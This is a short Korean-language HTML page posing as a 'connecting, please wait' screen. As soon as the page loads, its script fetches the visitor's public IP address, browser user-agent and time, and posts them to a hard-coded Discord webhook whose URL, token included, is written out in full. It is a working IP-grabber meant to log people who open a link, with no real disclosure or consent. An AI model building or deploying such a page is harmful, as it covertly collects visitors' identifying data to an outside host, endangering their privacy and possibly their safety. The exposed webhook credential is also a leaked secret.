<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>접속 중...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f0f2f5;
      font-family: sans-serif;
    }
    .box {
      text-align: center;
      background: white;
      padding: 60px 50px;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      max-width: 400px;
    }
    h1 {
      color: #5865F2;
      margin-bottom: 20px;
    }
    #status {
      padding: 20px;
      border-radius: 12px;
      font-size: 1.1em;
      min-height: 80px;
      transition: all 0.3s;
    }
    .success {
      background: #d4edda;
      color: #155724;
    }
  </style>
</head>
<body>

  <div class="box">
    <h1>잠시만 기다려주세요...</h1>
    <div id="status">정보 기록 중입니다...</div>
  </div>

  <script>
    window.addEventListener('load', async () => {
      const status = document.getElementById('status');

      try {
        // IP 주소 가져오기
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipRes.json();

        // 기기 정보 간단히
        const ua = navigator.userAgent.substring(0, 120) || '알 수 없음';
        const now = new Date().toISOString();

        // Discord에 보낼 메시지 (content 필드만 사용 → 가장 안정적)
        const message = `새 접속\n\nIP: \`${ip}\`\n기기: ${ua}\n시간: ${now}`;

        // 새 웹훅 주소
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1462340545899663413/8oysxIKM_VRUnK_P88e6GGdlYoPmSlHQUaoOLI9oyQGcOIsKaIJxSXdcWmvCX_SEINwx";

        await fetch(WEBHOOK_URL, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: message })
        });

        status.innerHTML = "기록 완료 ✓";
        status.classList.add('success');

      } catch (err) {
        console.error('에러:', err);
        status.innerHTML = "기록 실패 ㅠㅠ<br>콘솔(F12) 확인해주세요";
      }
    });
  </script>

</body>
</html>
